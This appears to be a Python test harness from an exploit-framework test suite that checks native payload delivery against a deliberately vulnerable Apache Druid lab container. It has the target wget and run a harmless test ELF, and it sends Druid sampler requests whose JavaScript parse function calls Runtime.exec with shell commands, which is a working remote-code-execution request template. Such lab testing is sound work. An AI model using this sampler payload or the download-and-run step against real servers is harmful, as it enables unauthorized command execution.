"""Native download/ELF/Java-array gates before any module session attempt."""
import base64
import hashlib
import json
import os
from pathlib import Path
import shlex
import sys
import urllib.request

sys.dont_write_bytecode = True
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / 'druid'))
from native_client import NativeDruid

runtime = json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text())
base = Path(runtime['artifacts'])
phase = base / 'native-delivery'
phase.mkdir()
client = NativeDruid(dict(runtime, artifacts=str(phase)))
proof = {'architectures': {}, 'java_arrays': []}
try:
    proof['nasm'] = client.cli('framework', 'nasm', '-v')['stdout']
    proof['kernel'] = client.cli('vulnerable', 'uname', '-a')['stdout']
    for arch in [64, 32]:
        compiled = phase / ('exit-' + str(arch))
        source = '/usr/src/metasploit-framework/test/module_targets/druid_sessions/native_exit.asm'
        client.cli('framework', 'nasm', '-f', 'bin', '-DARCH=' + str(arch), source, '-o', str(compiled))
        client.cli('framework', 'chmod', '755', str(compiled))
        data = compiled.read_bytes()
        assert data[:5] == b'\x7fELF' + bytes([2 if arch == 64 else 1])
        sha = hashlib.sha256(data).hexdigest()
        path = '/native-elf/native-delivery/exit-' + str(arch)
        response = urllib.request.urlopen(client.base_url + path, timeout=8)
        actual = response.read()
        client.requests.append({'url': client.base_url + path, 'status': response.status, 'headers': dict(response.headers), 'response_base64': base64.b64encode(actual).decode(), 'sha256': hashlib.sha256(actual).hexdigest()})
        client.save()
        assert response.status == 200 and actual == data
        target = '/tmp/module-target-druid-native-elf-' + str(arch)
        client.cli('vulnerable', 'test', '!', '-e', target)
        client.cli('vulnerable', 'wget', '-qO', target, 'http://gateway' + path)
        downloaded = client.cli('vulnerable', 'sha256sum', target)['stdout'].split()[0]
        assert downloaded == sha
        client.cli('vulnerable', 'chmod', '755', target)
        execution = client.cli('vulnerable', target, check=False)
        proof['architectures'][str(arch)] = {'source_sha256': hashlib.sha256(Path(__file__).with_name('native_exit.asm').read_bytes()).hexdigest(), 'elf_sha256': sha, 'download_sha256': downloaded, 'bytes': len(data), 'actual_exitstatus': execution['exitstatus'], 'supported': execution['exitstatus'] == 42, 'execution': execution}
        client.cli('vulnerable', 'rm', '--', target)
        client.cli('vulnerable', 'test', '!', '-e', target)
    assert proof['architectures']['64']['supported'], proof['architectures']['64']

    # Independently tests the proposed minimal Java argument-array form, not
    # Framework's generator or scanner wrapper. Failed conversion is retained.
    for index, value in enumerate(['Double " and single \' : spaces', 'backslash\\t\\path', 'before`@~after']):
        marker = '/tmp/module-target-druid-native-array-' + str(index)
        client.cli('vulnerable', 'test', '!', '-e', marker)
        command = "printf '%s' " + shlex.quote(value) + ' > ' + marker
        arguments = ['/bin/sh', '-c', command]
        function = 'function(){var p=java.lang.Runtime.getRuntime().exec(' + json.dumps(arguments) + ');p.waitFor();return {time:"2026-11-10T00:00:00Z",name:"native-array",value:p.exitValue()};}'
        body = {'type': 'index', 'spec': {'ioConfig': {'type': 'index', 'firehose': {'type': 'inline', 'data': 'native'}}, 'dataSchema': {'dataSource': 'module_native_array', 'parser': {'type': 'string', 'parseSpec': {'format': 'javascript', 'timestampSpec': {'column': 'time', 'format': 'iso'}, 'dimensionsSpec': {'dimensions': ['name']}, 'function': function, '': {'enabled': True}}}}}, 'samplerConfig': {'numRows': 1, 'timeoutMs': 3000}}
        response = client.request('/vulnerable/', 'druid/indexer/v1/sampler', body)
        actual = client.cli('vulnerable', 'sh', '-c', 'if test -f "$1"; then cat "$1"; fi', 'sh', marker)['stdout']
        result = {'arguments': arguments, 'expected_base64': base64.b64encode(value.encode()).decode(), 'actual_base64': base64.b64encode(actual.encode()).decode(), 'status': response['status'], 'supported': response['status'] == 200 and actual == value}
        proof['java_arrays'].append(result)
        exists = client.cli('vulnerable', 'sh', '-c', 'if test -f "$1"; then printf present; else printf absent; fi', 'sh', marker)['stdout'] == 'present'
        result['marker_existed'] = exists
        if exists:
            result['stat'] = client.cli('vulnerable', 'stat', '-c', '%u:%g:%s', marker)['stdout'].strip()
            client.cli('vulnerable', 'rm', '--', marker)
        client.cli('vulnerable', 'test', '!', '-e', marker)
    proof['counts'] = {'commands': len(client.commands), 'requests': len(client.requests)}
finally:
    phase.joinpath('proof.json').write_text(json.dumps(proof, indent=2))
    client.save()
print(json.dumps(proof))
